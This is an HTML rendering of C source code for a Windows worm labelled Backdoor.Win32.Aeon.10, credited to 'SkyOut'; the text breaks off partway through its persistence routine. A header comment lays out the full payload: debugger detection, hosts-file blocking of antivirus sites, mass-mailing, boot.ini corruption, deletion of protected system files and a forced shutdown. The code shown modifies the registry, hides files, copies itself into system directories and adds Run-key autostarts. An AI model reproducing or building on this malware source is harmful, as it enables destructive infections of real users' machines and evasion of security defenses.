<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Backdoor.Win32.Aeon.10 - Aeon.SRC.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
Payload of Aeon:

- The worm is waiting for 5 minutes, before starting the code
- Create a mutex to make sure the worm is only running once
- Check for SoftIce/OllyDbg/FileMon/RegMon and exit virus if found
- Change Name / Organisation values in Registry
- Change settings to hide file extensions and don't show hidden files in explorer
- Copy to different locations on PC and write Run value in HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE
- Drop a HTML-File into %sysdir% and change IE Start Page to it
- Reset all individual settings of Firefox and change Start Page to the same HTML-File IE is using
- Change Opera Start Page to the HTML-File as well and change the values of the installed Search Engines
- Modify hosts and hosts.msn (by MSN Messenger) to make it impossible to connect to most AV related pages
- Disable the MAPI Warning in Outlook to hide from user
- Stay in background and try to spread via email every 60 seconds by creating a thread
- Check the date, on the 1st, 14th and 28th run the Payload:
    - Modify the " boot.ini " file, which will result in an error message before even starting the bootloader
    - Change almost all file associations in HKEY_CLASSES_ROOT
    - Set all system colors to black
    - Change registry values opening a messagebox before login page can be reached
    - Destroy various files listed in an array, which are located in %sysdir% and protected by windows
    - Wait about 5 seconds and close the upcoming warning message on german and english windows versions (using window handle)
    - Drop a batch file and open it several times
    - Shut down the system finally

=========================================================================
=========================================================================

    Author: SkyOut

    Compiled with: -&gt; Visual C++ 2005 Express Edition
                   -&gt; Microsoft PSDK for Windows Server 2003 R2

    Finished: 09th August 2006 - 04:00 - GMT +01:00

*/</span><span class="sc0">

</span><span class="sc1">/* Defining Windows Version being WindowsXP (0x0501) */</span><span class="sc0">
</span><span class="sc9">#define WIN32_WINNT 0x0501
</span><span class="sc0">
</span><span class="sc1">/* The headers we need for our virus */</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;shellapi.h&gt;
#include &lt;shlobj.h&gt;
#include &lt;mapi.h&gt;
</span><span class="sc0">
</span><span class="sc1">/* Change the Name and Organization value of Windows, can be seen in System Information */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ChangeNameOrg</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szOwner</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"SkyOut [ Aeon Virus ]"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szOrganization</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"[ E - O - F ]"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RegisteredOwner"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szOwner</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szOwner</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RegisteredOrganization"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szOrganization</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szOrganization</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* This will pop up a messagebox every time before user can login to Windows */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Messagebox</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szCaption</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"SkyOut | Aeon Virus ]"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szText</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Your computer has been infected with the [Aeon] Virus -&gt; SkyOut -&gt; [Electrical Ordered Freedom]"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LegalNoticeCaption"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCaption</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szCaption</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LegalNoticeText"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szText</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szText</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Files with file attribute hidden are invisible in explorer and file extensions are not shown as well */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">MakeHidden</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNull</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwOne</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Hidden"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_DWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPBYTE</span><span class="sc10">)&amp;</span><span class="sc11">dwNull</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"HideFileExt"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_DWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPBYTE</span><span class="sc10">)&amp;</span><span class="sc11">dwOne</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Copy to 5 different locations in %sysdir% (hidden):
    - %sysdir%
    - %sysdir%\wbem
    - %sysdir%\drivers
    - %sysdir%\spool
    - %sysdir%\oobe

Then write Run entries for all files in:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CopyToPC</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">Mod</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szVirusPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir1</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir3</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir4</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir5</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc1">/* Get current location */</span><span class="sc0">
    </span><span class="sc11">Mod</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">Mod</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc1">/* Get the location of %sysdir% */</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir1</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Aeon.exe"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\wbem\\Aeon.exe"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir3</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\drivers\\Aeon.exe"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir4</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\spool\\Aeon.exe"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir5</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\oobe\\Aeon.exe"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Copy the file from its current location into the five locations ins %sysdir% */</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Make sure HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run exists */</span><span class="sc0">
    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Make sure HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run exists */</span><span class="sc0">
    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Write Run values in HKEY_LOCAL_MACHINE */</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon1"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir1</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon2"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon3"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir3</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon4"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir4</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon5"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir5</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Write Run values in HKEY_CURRENT_USER */</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon1"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir1</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon2"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Aeon3"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szSysDir3</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

